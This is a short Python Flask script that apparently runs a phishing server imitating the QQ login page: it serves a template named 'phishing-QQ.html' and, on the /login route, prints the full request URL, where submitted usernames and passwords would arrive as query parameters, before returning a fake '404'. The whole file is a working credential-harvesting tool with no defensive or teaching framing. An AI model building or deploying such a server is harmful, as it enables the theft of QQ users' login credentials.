from flask import Flask, render_template,request

app = Flask(__name__)

@app.route('/QQlogin')
def index():
    
    return render_template('phishing-QQ.html')
    
@app.route('/login',methods=['get'])
def login():
    print('[*]',request.url)
    return '404'

def main():
    print('hello')
    app.run(host="0.0.0.0",debug=True,port=8080)


main()

